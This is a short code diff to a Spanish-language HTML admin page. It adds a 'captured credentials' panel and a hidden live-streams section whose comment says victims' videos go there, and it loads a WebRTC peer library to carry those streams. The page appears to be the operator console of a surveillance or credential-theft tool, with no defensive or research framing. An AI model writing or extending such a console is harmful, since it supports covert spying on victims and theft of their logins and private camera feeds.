@@ -39,8 +39,22 @@
             </div>
 
             <div class="device-list">
-                <h2>Dispositivos Monitoreados</h2>
+                <h2>Dispositivos Monitoreados (Activos)</h2>
                 <div id="devices-container"></div>
+            </div>
+
+            <div class="credentials-list" style="margin-top: 20px;">
+                <h2>Credenciales Capturadas</h2>
+                <div id="credentials-container" style="background: #001100; border: 1px solid #0f0; border-radius: 4px; max-height: 200px; overflow-y: auto; padding: 10px;">
+                    <p style="color: #666; font-style: italic;">Sin credenciales capturadas aún.</p>
+                </div>
+            </div>
+
+            <div class="media-streams" id="media-streams" style="margin-top: 20px; display: none;">
+                <h2>Streams en Vivo</h2>
+                <div style="display: flex; gap: 10px; flex-wrap: wrap;" id="streams-container">
+                    <!-- Los videos de las victimas irán aquí -->
+                </div>
             </div>
         </div>
 
@@ -53,6 +67,7 @@
         </div>
     </div>
 
+    <script src="https://unpkg.com/simple-peer@9.11.1/simplepeer.min.js"></script>
     <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
     <script src="js/config.js"></script>
     <script src="js/admin.js"></script>
